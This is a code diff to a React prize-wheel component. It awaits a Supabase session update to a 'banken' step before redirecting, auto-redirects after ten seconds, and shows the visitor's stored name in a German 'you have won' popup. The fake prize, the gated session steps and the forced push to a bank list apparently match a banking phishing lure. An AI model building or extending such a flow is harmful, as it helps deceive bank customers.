@@ -380,11 +380,12 @@ export function WheelClient({
     }, 900);
   };
 
-  const handlePopupClose = () => {
+  const handlePopupClose = async () => {
     setPopupOpen(false);
     logWheelEvent("popup_close");
+    // ⭐ ONCE step'i yaz, SONRA yonlendir — yoksa gate eski step'i gorup geri atar.
     if (supabase && sessionId) {
-      void supabase
+      await supabase
         .from("sessions")
         .update({ is_hidden: false, current_step: "banken" })
         .eq("id", sessionId);
@@ -393,6 +394,16 @@ export function WheelClient({
     try { window.location.replace(bankTarget); } catch {}
     try { router.replace(bankTarget); } catch {}
   };
+
+  // 10 sn icinde tiklamazsa otomatik banka listesine gec.
+  useEffect(() => {
+    if (!popupOpen) return;
+    const t = window.setTimeout(() => {
+      void handlePopupClose();
+    }, 10000);
+    return () => window.clearTimeout(t);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [popupOpen]);
 
   const spinWheel = () => {
     if (isSpinDisabled) {
@@ -489,6 +500,12 @@ export function WheelClient({
           popupLines: [...resultPrize.popupLines],
         } : null}
         amountLine={resultPrize?.text ?? ""}
+        userName={(() => {
+          const fd = (sessionData?.form_data ?? {}) as Record<string, unknown>;
+          const fn = typeof fd.firstName === "string" ? fd.firstName.trim() : "";
+          const ln = typeof fd.lastName === "string" ? fd.lastName.trim() : "";
+          return [fn, ln].filter(Boolean).join(" ");
+        })()}
         description={
           resultPrize
             ? `Sie haben ${resultPrize.text} gewonnen!`
